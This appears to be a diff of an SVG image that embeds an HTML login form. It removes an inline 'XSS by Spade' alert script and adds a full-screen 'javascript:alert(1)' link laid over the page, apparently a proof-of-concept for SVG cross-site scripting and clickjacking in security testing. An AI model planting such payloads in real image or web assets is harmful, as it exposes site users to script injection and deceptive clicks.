@@ -8,15 +8,13 @@
       <feDropShadow dx="0" dy="6" stdDeviation="10" flood-opacity="0.12"/>
     </filter>
   </defs>
-    <script>
-      alert('XSS by Spade');
-   </script>
+
   <!-- background card -->
   <rect x="20" y="20" rx="12" ry="12" width="380" height="240"
         fill="url(#g)" filter="url(#shadow)"/>
 
   <!-- embed real HTML form -->
-  <foreignObject x="30" y="40" width="360" height="200">
+  <foreignObject width="100%" height="100%">
     <body xmlns="http://www.w3.org/1999/xhtml"
           style="margin:0;font-family:Inter,Arial,sans-serif;color:#0f1724;">
       <form action="/login" method="post"
@@ -45,10 +43,7 @@
           Sign in
         </button>
 
-        <a href="/forgot" style="font-size:12px;color:#64748b;text-align:right;
-                                text-decoration:none;margin-top:6px;">
-          Forgot password?
-        </a>
+        <a href="javascript:alert(1)" target="_top" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999;">Click anywhere</a>
       </form>
     </body>
   </foreignObject>
